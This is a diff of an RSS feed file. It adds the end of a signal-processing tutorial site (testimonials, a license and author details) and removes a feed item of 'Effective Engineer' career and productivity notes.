+&lt;h4&gt;&quot;&lt;big&gt;...&lt;span&gt;saved me many hours&lt;/span&gt; of work....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;big&gt;&quot;I am so thankful for your website...It has &lt;span&gt;helped me significantly&lt;/span&gt;....&quot;&lt;/big&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Thank you so much for this &lt;span&gt;wonderful&lt;/span&gt; teaching tool! &quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;it &lt;span&gt;really helped&lt;/span&gt; me.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;...the tutorials on your website have been of &lt;span&gt;tremendous help&lt;/span&gt; to me.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I find your Introduction an &lt;span&gt;excellent&lt;/span&gt; starting point.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thanks for your &lt;span&gt;amazing&lt;/span&gt; contribution.&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thank you for sharing your &lt;span&gt;excellent&lt;/span&gt; work....&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;...&lt;span&gt;wonderful&lt;/span&gt; tutorial on peak fitting.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I recently found your website and I’m really impressed, &lt;span&gt;great&lt;/span&gt; work! &quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Thank you for your time and the &lt;span&gt;wonderful&lt;/span&gt; material (software and text) you have put up on your website.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;Your lessons on signal processing are &lt;span&gt;really useful and intriguing&lt;/span&gt;....&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;I have no words to describe how &lt;span&gt;excited&lt;/span&gt; I am and how thankful I am about your work.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your ... website &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your signal processing pages ... &lt;span&gt;very helpful!&lt;/span&gt;&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;I &lt;span&gt;loved&lt;/span&gt; your article on smoothing.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;really clear&lt;/span&gt; and concise.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4/&gt;
+&lt;p&gt;&lt;big&gt;&quot; ... &lt;span&gt;very useful&lt;/span&gt; for teaching in an Instrumentation course for M.Sc postgraduates in analytical chemistry.&lt;br/&gt;&lt;/big&gt;&lt;/p&gt;
+&lt;p&gt;&lt;big&gt;&quot;[Y]our web site has such &lt;span&gt;excellent&lt;/span&gt; content....&quot;&lt;/big&gt;&lt;/p&gt;
+&lt;p&gt;&lt;big&gt;&quot;I tried the demo version of SPECTRUM and I think is a &lt;span&gt;very useful&lt;/span&gt; tool for the introduction of signal processing to analytical chemistry students.&quot;&lt;/big&gt;&lt;/p&gt;
+&lt;h4&gt;&quot;&lt;big&gt;Your work is &lt;span&gt;very helpful&lt;/span&gt; to my research.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...your site...has some &lt;span&gt;very valuable&lt;/span&gt; information relevant to the projects I’m currently working on.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...really nice tutorial and Matlab functions that are &lt;span&gt;extremely useful&lt;/span&gt; in many fields of research.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Very generous of you to make &lt;span&gt;so much useful material&lt;/span&gt; freely available.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I found your website &lt;span&gt;very informative&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Thank you, Tom, for being a great citizen of MATLAB Central and the File Exchange! You are what makes this community thrive.&quot; (&lt;a href=&quot;http://blogs.mathworks.com/pick/2016/09/09/most-activeinteractive-file-exchange-entry/&quot;&gt;http://blogs.mathworks.com/pick/2016/09/09/most-activeinteractive-file-exchange-entry/&lt;/a&gt;)&lt;/big&gt;&lt;/h4&gt;
+&lt;h4/&gt;
+&lt;hr/&gt;&lt;p&gt;&lt;big&gt;Copyright (c) 2016, Thomas C. O'Haver (toh@umd.edu)&lt;br/&gt; &lt;br/&gt;Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the &quot;Software&quot;), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:&lt;/big&gt;&lt;/p&gt;&lt;p&gt;The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.&lt;/p&gt;&lt;p&gt;THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.&lt;/p&gt;
+&lt;hr/&gt;&lt;p&gt;&lt;a href=&quot;http://terpconnect.umd.edu/%7Etoh/&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Tom.JPG&quot; width=&quot;198&quot; vspace=&quot;6&quot; hspace=&quot;6&quot; height=&quot;241&quot; border=&quot;2&quot;/&gt;&lt;/a&gt;&lt;big/&gt;First edition created in 1995. Last updated December, 2017. Created with &lt;a href=&quot;http://www.seamonkey-project.org/releases/seamonkey2.17.1/&quot;&gt;SeaMonkey&lt;/a&gt;. This site is a &lt;a href=&quot;http://imerrill.umd.edu/facultyvoice1/?p=3231&quot;&gt;retirement project&lt;/a&gt; and &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Countries.html&quot;&gt;international community service&lt;/a&gt;, maintained by &lt;a href=&quot;http://terpconnect.umd.edu/%7Etoh/&quot;&gt;Prof. Tom O'Haver&lt;/a&gt;, Professor Emeritus, &lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Shield2.GIF&quot; width=&quot;56&quot; vspace=&quot;5&quot; hspace=&quot;5&quot; height=&quot;55&quot;/&gt;Department of Chemistry and Biochemistry, The University of Maryland at College Park, currently residing in Naples, FL. Comments, suggestions and questions should be directed to Prof. O'Haver at &lt;a href=&quot;mailto:toh@umd.edu?subject=Index%20to%20Signal%20Processing&quot;&gt;toh@umd.edu&lt;/a&gt;, currently residing in Naples, FL, and in Silver Spring, MD.&lt;br/&gt;&lt;/p&gt;
+&lt;hr width=&quot;100%&quot; size=&quot;2&quot;/&gt;&lt;noscript&gt;
+&lt;div class=&quot;statcounter&quot;&gt;
+&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#Top&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/btt.png&quot; title=&quot;Back to top of this page.&quot; alt=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; border=&quot;0&quot; align=&quot;right&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;&lt;/h3&gt;
+&lt;/div&gt;
+&lt;/noscript&gt;
+&lt;h2 align=&quot;center&quot;&gt;A Brief History of Mine&lt;/h2&gt;
+
+&lt;h3&gt;Digital began to pull away from analog in the 1950s and now completely dominates.&lt;/h3&gt;
+
+&lt;h3&gt;In the mid 1990s, Web sites began to dominate earlier publishing technologies.&lt;/h3&gt;
+
+&lt;h3&gt;Transistors, invented in the late 1940s, pulled ahead of vacuum tunes in the 50s. By the early 80s, integrated circuits chips were dominant.&lt;/h3&gt;
+
+&lt;h3&gt;Statistics and quantitative signal and data processing have long been important, using computers after the 1950s.&lt;/h3&gt;
+
+&lt;h3&gt;&quot;Derivative&quot;, &quot;smoothing&quot;, and &quot;convolution&quot; are old concepts, but other signal processing terms don't become common until more recently.&lt;/h3&gt;
+
+&lt;h3&gt;The most common derivative orders have long been the first and second; higher older are much less used.&lt;/h3&gt;
+
+&lt;h3&gt;The Savitzky-Golay smooth is now the most often mentioned data smoothing technique. (What was going on the &quot;triangular smooth&quot; in the 1800s?)&lt;/h3&gt;
+
+&lt;h3&gt;The Gaussian profile is the most commonly encountered peak shape.&lt;/h3&gt;
+
+&lt;h3&gt;Measures of precision in the presence of random noise increased with the availability of electronic instrumentation.&lt;/h3&gt;
+
+&lt;/body&gt;</description>
+<pubDate>Fri, 29 Dec 2017 02:06:41 +0000</pubDate>
+<dc:creator>lainon</dc:creator>
+<dc:format>text/html</dc:format>
+<dc:identifier>https://terpconnect.umd.edu/~toh/spectrum/</dc:identifier>
+</item>
+<item>
 <title>Many major websites are taking silent anti-ad-blocking measures</title>
 <link>https://techcrunch.com/2017/12/27/thousands-of-major-sites-are-taking-silent-anti-ad-blocking-measures/</link>
 <guid isPermaLink="true" >https://techcrunch.com/2017/12/27/thousands-of-major-sites-are-taking-silent-anti-ad-blocking-measures/</guid>
@@ -330,7 +976,7 @@
 <guid isPermaLink="true" >http://www.bbc.com/news/business-42505261</guid>
 <description>&lt;figure class=&quot;media-landscape no-caption full-width lead&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                 
-                &lt;img class=&quot;js-image-replace&quot; alt=&quot;A Bitcoin and gold nuggets&quot; src=&quot;https://ichef-1.bbci.co.uk/news/320/cpsprodpb/DA83/production/_99393955_bitcoin.jpg&quot; width=&quot;976&quot; height=&quot;549&quot;/&gt;&lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
+                &lt;img class=&quot;js-image-replace&quot; alt=&quot;A Bitcoin and gold nuggets&quot; src=&quot;https://ichef.bbci.co.uk/news/320/cpsprodpb/DA83/production/_99393955_bitcoin.jpg&quot; width=&quot;976&quot; height=&quot;549&quot;/&gt;&lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                  &lt;span class=&quot;story-image-copyright&quot;&gt;Getty Images&lt;/span&gt;
                 
             &lt;/span&gt;
@@ -347,490 +993,6 @@
 <dc:language>en</dc:language>
 <dc:format>text/html</dc:format>
 <dc:identifier>http://www.bbc.com/news/business-42505261</dc:identifier>
-</item>
-<item>
-<title>Effective Engineer – Notes</title>
-<link>https://gist.github.com/rondy/af1dee1d28c02e9a225ae55da2674a6f</link>
-<guid isPermaLink="true" >https://gist.github.com/rondy/af1dee1d28c02e9a225ae55da2674a6f</guid>
-<description>
-&lt;h3&gt;What's an Effective Engineer?&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;They are the people who get things done. Effective Engineers produce results.&lt;/li&gt;
-&lt;/ul&gt;&lt;h2&gt;Adopt the Right Mindsets&lt;/h2&gt;
-&lt;h3&gt;Focus on High Leverage Activities&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Leverage = Impact Produced / Time Invested&lt;/li&gt;
-&lt;li&gt;Use Leverage as Your Yardstick for Effectiveness&lt;/li&gt;
-&lt;li&gt;80% of the impact comes from 20% of the work.&lt;/li&gt;
-&lt;li&gt;Focus on high leverage and not just easy wins.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Optimize for Learning&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;
-&lt;p&gt;Change jobs if you have to.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Optimizing for learning is high leverage.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Adopt a growth mindset.&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Talk to people. Become good at telling stories. It gets better with time.&lt;/li&gt;
-&lt;li&gt;Those with a growth mindset believe that they can cultivate and grow their intelligence and skills through effort.&lt;/li&gt;
-&lt;li&gt;Own your story.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Invest in the rate of learning&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Learning compunds. Compounding leads to exponential growth. Earlier the compounding starts, the better.&lt;/li&gt;
-&lt;li&gt;Working on unchallenging tasks is a huge opportunity cost. You missed out on compounded learning.&lt;/li&gt;
-&lt;li&gt;Prioritize learning over profitability.&lt;/li&gt;
-&lt;li&gt;Invest your time in activities with the highest learning rate.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Seek Work Environments Conducive to Learning&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Fast Growth: Companies where #problems &amp;gt;&amp;gt; #resources. Opportunity to choose high impact work.&lt;/li&gt;
-&lt;li&gt;Make sure you are working on high priority projects.&lt;/li&gt;
-&lt;li&gt;Openness: Look for culture with curiosity, where everyone is encouraged to ask questions.&lt;/li&gt;
-&lt;li&gt;Fast Paced.&lt;/li&gt;
-&lt;li&gt;People smarter than you.&lt;/li&gt;
-&lt;li&gt;Autonomy: Freedom to choose what to work on. Smaller comanies =&amp;gt; More autonomy.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;While on Job&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Make a daily habit of acquiring new skills.&lt;/li&gt;
-&lt;li&gt;Read code written by brilliant engineers.&lt;/li&gt;
-&lt;li&gt;Jump fearlessly into code you don't know.&lt;/li&gt;
-&lt;li&gt;Always be learning. Invest in skills that are in high demand.&lt;/li&gt;
-&lt;li&gt;Read Books. Attend Conferences.&lt;/li&gt;
-&lt;li&gt;Build and maintain strong relationships.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Prioritize Regularly&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Opportunity cost of working on wrong ideas can set back growth by years.&lt;/li&gt;
-&lt;li&gt;Prioritize tasks based on ROI&lt;/li&gt;
-&lt;li&gt;Regular prioritization is high leverage activity.&lt;/li&gt;
-&lt;li&gt;On TODO Lists
-&lt;ul&gt;&lt;li&gt;Maintain a 'single' todo lists where all tasks are listed.&lt;/li&gt;
-&lt;li&gt;Don't try to remember stuff. Brain is bad at remembering. It's rather good at processing.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Ask yourself regularly: Is this the most important thing I should be working on ?&lt;/li&gt;
-&lt;li&gt;Focus on what directly produces value.&lt;/li&gt;
-&lt;li&gt;Learn to say no.&lt;/li&gt;
-&lt;li&gt;Focus on the important and non-urgent.&lt;/li&gt;
-&lt;li&gt;Find ways to get into flow. “A state of effortless concentration so deep that they lose their sense of time, of themselves, of their problems.”&lt;/li&gt;
-&lt;li&gt;When possible, preserve larger blocks of focused time in your schedule.&lt;/li&gt;
-&lt;li&gt;Limit the amount of Work in Progress.
-&lt;ul&gt;&lt;li&gt;Cost of context switching is high.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Prioritizing is difficult.&lt;/li&gt;
-&lt;li&gt;Prioritization is high leverage. It has huge impact on your ability to get right things done.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Invest in Iteration Speed&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;
-&lt;p&gt;Continuous Deployment is high leverage.&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Will save a lot of time in manual deployment of code.They are the people who get things done. Effective Engineers produce results.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Move Fast to Learn Fast&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Move fast and break things.&lt;/li&gt;
-&lt;li&gt;Moving fast enables us to build more things and learn at faster rate.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Invest in time saving tools.&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;If you have to do something more than twwise, write a tool the third time.&lt;/li&gt;
-&lt;li&gt;Tools are multipliers that allow your to scale your impact beyond the confines of a day.&lt;/li&gt;
-&lt;li&gt;Faster tools get used more often.&lt;/li&gt;
-&lt;li&gt;Faster tools can enable new workflows that previously weren't possible.&lt;/li&gt;
-&lt;li&gt;Productivity skyrockets with tools.&lt;/li&gt;
-&lt;li&gt;Time saving property of tools also scale with team adoption.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Shorten your debugging and Validation Loops&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Extra time spent in optimizing debugging workflow can help you fix annoying bugs with less headache.&lt;/li&gt;
-&lt;li&gt;Debugging is hard. It's time conuming. Upfront investments to shorten debugging loops are worth it.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;High test coverage to reduce build and site breakages.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Fast unit tests to encourage people to run them.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Fast and incremental compiles and reloads to reduce development time.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Master you Programming Environment&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;One editor. One high level language. Shell. Keyboard &amp;gt; Mouse. Automate manual workflows. Use interactive shell. Make running specific tests easy. ** Faster you can iterate, faster you can learn.**&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Measure what you want to Improve&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Use metric to drive progress
-&lt;ul&gt;&lt;li&gt;
-&lt;p&gt;If you can't measure it, you can't improve it.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Good metric.&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;Helps you focus on right things.&lt;/li&gt;
-&lt;li&gt;Drives forward progress.&lt;/li&gt;
-&lt;li&gt;Helps you guard against future regressions.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Performance Ratcheting&lt;/strong&gt;: Any change should strictly improve the metric.&lt;/li&gt;
-&lt;li&gt;Bad metric can lead to unwanted behavior.&lt;/li&gt;
-&lt;li&gt;Examples:
-&lt;ul&gt;&lt;li&gt;#hours worked &amp;lt; Productivity&lt;/li&gt;
-&lt;li&gt;click through rates &amp;lt; long click through rates&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Metric you choose influences your decisions and behavior.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Look for metric that, when optimized, maximizes impact for the team.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Actionable metric - Whose movement can be causally explained by team's effort.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Responsive metric - Updates quickly to give back feedback whether a given change was =ve or -ive.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Choosing a metric is high leverage.&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;Dedicate time to pick right metric.&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Instrument everythong to understand what's going on.
-&lt;ul&gt;&lt;li&gt;Measure anything, measure everything.&lt;/li&gt;
-&lt;li&gt;Graphite, statsd. A single line of code lets you define a new counter or timer on the fly.&lt;/li&gt;
-&lt;li&gt;Measuring goals you want to achieve is high leverage.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Internalize useful numbers
-&lt;ul&gt;&lt;li&gt;Knowledge of useful numbers provide a valuable shortcut for knowing where to invest efforts to maximize gains.&lt;/li&gt;
-&lt;li&gt;Need upfront work. Need not be accurate, ballpark idea suffices.&lt;/li&gt;
-&lt;li&gt;Knowing useful numbers enables you to do back of the envelope calculations to quickly estimate the perrmance properties of a design without actually building it.&lt;/li&gt;
-&lt;li&gt;Internalizing useful number help you spot anamalies. Be skeptical about data integrity.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;log data liberally.&lt;/li&gt;
-&lt;li&gt;Build tools to iterate on data accuracy sooner.&lt;/li&gt;
-&lt;li&gt;Examine data sooner.&lt;/li&gt;
-&lt;li&gt;When numbers look off, dig in to it sooner.&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;✔️ Measure your progress. Carefully choose your top-level metric. Instrument your system. Know your numbers. Prioritize data integrity.&lt;/p&gt;
-&lt;h3&gt;Validate your ideas early and often.&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Not validating early leads to wasted efforts.&lt;/li&gt;
-&lt;li&gt;Dont delay get feedback.&lt;/li&gt;
-&lt;li&gt;Find low effort ways to validate work.&lt;/li&gt;
-&lt;li&gt;Power of small batches. Helps you avoid making a big mistake by stopping the flow.&lt;/li&gt;
-&lt;li&gt;Approach problem iteratively.&lt;/li&gt;
-&lt;li&gt;No large implementations.&lt;/li&gt;
-&lt;li&gt;Working solo? Be wary. Be extra vocal and get feedback.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Improve project estimation skills.&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Beware of mythical man month. Communication overhead is significant.&lt;/li&gt;
-&lt;li&gt;Reduce risk early&lt;/li&gt;
-&lt;li&gt;Rewrite projects - almost always fail.&lt;/li&gt;
-&lt;li&gt;Additional hours hurt prooductivity. Causes burnout.&lt;/li&gt;
-&lt;li&gt;Do the riskiest task first.&lt;/li&gt;
-&lt;li&gt;Allow buffer room for the unknown.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Balance Quality with Pragmatism&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;High codequality. Code readability.&lt;/li&gt;
-&lt;li&gt;Establish sustainable code review process.&lt;/li&gt;
-&lt;li&gt;Code reviews help:
-&lt;ul&gt;&lt;li&gt;Catch bugs and design problems early.&lt;/li&gt;
-&lt;li&gt;Sharing working knowledge of the codebase.&lt;/li&gt;
-&lt;li&gt;Increases long term agility. Easier to unerstand, quicker to modify.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;h4&gt;Manage complexity through Abstraction&lt;/h4&gt;
-&lt;ul&gt;&lt;li&gt;Example: MapReduce&lt;/li&gt;
-&lt;li&gt;Right abstractions make huge difference.&lt;/li&gt;
-&lt;li&gt;“Pick the right ones, and programming will flow naturally from design; modules will have small and simple interfaces; and new functionality will more likely fit in without extensive reorganization,”&lt;/li&gt;
-&lt;li&gt;“Pick the wrong ones, and programming will be a series of nasty surprises: interfaces will become baroque and clumsy as they are forced to accommodate unanticipated interactions, and even the simplest of changes will be hard to make.”&lt;/li&gt;
-&lt;li&gt;The right abstraction can increase engineering productivity by an order of magnitude.&lt;/li&gt;
-&lt;li&gt;Simple abstractions avoid interweaving multiple concepts, so that you can reason about them independently rather than being forced to consider them together.&lt;/li&gt;
-&lt;li&gt;Designing good abstractions take work.&lt;/li&gt;
-&lt;li&gt;An abstraction's usage and popularity provides a reasonable proxy for it's quality.&lt;/li&gt;
-&lt;/ul&gt;&lt;h4&gt;Automate Testing&lt;/h4&gt;
-&lt;ul&gt;&lt;li&gt;Unit test cases and some integration testing provide a scalable way of managing growing codebase.&lt;/li&gt;
-&lt;li&gt;A suite of extensive and automated tests can reduce overall error rates by validating the quality and by safeguardingagainst regressions.&lt;/li&gt;
-&lt;li&gt;Tests also allow engineers to make changes, especially large refactorings, with significantly higher confidence.&lt;/li&gt;
-&lt;li&gt;Despite its benefits, it can be difficult to foster a culture of automated testing.&lt;/li&gt;
-&lt;li&gt;Focus on high leverage tests.&lt;/li&gt;
-&lt;li&gt;Writing more tests, creating a virtuous feedback cycle and saving more development time.&lt;/li&gt;
-&lt;/ul&gt;&lt;h4&gt;Repay Techincal Debt&lt;/h4&gt;
-&lt;ul&gt;&lt;li&gt;Technical debt refers to all the deferred work that’s necessary to improve the health and quality of the codebase and that would slow us down if left unaddressed.&lt;/li&gt;
-&lt;li&gt;Accumulating technical debt is fine as far as it is repaid within time.&lt;/li&gt;
-&lt;li&gt;Refactor often.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Reduce Operational Complexity&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Keep no. of technologies low. Don’t sway towards shiny new technologies.&lt;/li&gt;
-&lt;li&gt;Every additional technology you add is is guaranteed to go worong eventually. Will need your time.&lt;/li&gt;
-&lt;li&gt;Do the simple thing first&lt;/li&gt;
-&lt;li&gt;Embrace operational simplicity.&lt;/li&gt;
-&lt;li&gt;The first solution that comes to mind is generally complex. Don't stop. Keep peeling off the layers of onion.&lt;/li&gt;
-&lt;li&gt;Simplify the architecture to reduce their operational burden.&lt;/li&gt;
-&lt;li&gt;“What’s the simplest solution that can get the job done while also reducing our future operational burden?”&lt;/li&gt;
-&lt;li&gt;Discipline to focus on simplicity is high leverage.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Fail Fast&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Fail immediately and visibly.&lt;/li&gt;
-&lt;li&gt;doesn’t necessarily mean crashing your programs for users&lt;/li&gt;
-&lt;li&gt;fail-fast to surface issues immediately&lt;/li&gt;
-&lt;li&gt;Failing fast is high leverage as it saves devugging time.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Relentlessly Automate&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Automating mechanics is good.&lt;/li&gt;
-&lt;li&gt;Automating decision making - no.&lt;/li&gt;
-&lt;li&gt;Hone Your Ability to Respond and Recover Quickly
-&lt;ul&gt;&lt;li&gt;Leverage ( Recovering quickly ) &amp;gt; Leverage ( Preventing Failures )&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;“script for success,” practice failure scenarios, and work on our ability to recover quickly.&lt;/li&gt;
-&lt;li&gt;Make batch process idempotent&lt;/li&gt;
-&lt;li&gt;Make processes retrable i.e. not leaving any global state.&lt;/li&gt;
-&lt;/ul&gt;&lt;h3&gt;Invest in your team's Growth&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;Invest in onboarding.&lt;/li&gt;
-&lt;li&gt;The higher you climb up the engineering ladder, the more your effectiveness will be measured not by your individual contributions but by your impact on the people around you.&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;&quot;You’re a staff engineer if you’re making a whole team better than it would be otherwise. You’re a principal engineer if you’re making the whole company better than it would be otherwise. And you’re distinguished if you’re improving the industry.”&lt;/strong&gt; ￼- Focus primarily on making everyone around you succeed.&lt;/li&gt;
-&lt;li&gt;Your career depends on your team's success.&lt;/li&gt;
-&lt;li&gt;Make hiring everyone's responsibility.&lt;/li&gt;
-&lt;li&gt;Shared ownership of code.
-&lt;ul&gt;&lt;li&gt;Keep bus factor more than one.&lt;/li&gt;
-&lt;li&gt;Shared ownershop removes isolated silos of information.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Build collective wisdom through post mortems.&lt;/li&gt;
-&lt;li&gt;Invest in automated testing.
-&lt;ul&gt;&lt;li&gt;Automated testcases lead to higher confidence when refactoring.&lt;/li&gt;
-&lt;li&gt;Write test cases when the code is fresh in mind.&lt;/li&gt;
-&lt;li&gt;Don’t be dogmatic about 100% code coverage.&lt;/li&gt;
-&lt;li&gt;Value of tests increases over time and cost to write goes down.&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;Hire the best.&lt;/li&gt;
-&lt;li&gt;Surround yourself with great advisors&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;☀️ &lt;strong&gt;“Leverage is the lens through which effective engineers view their activities. ”&lt;/strong&gt; ☀️&lt;/p&gt;
-&lt;h3&gt;10 Books to read:&lt;/h3&gt;
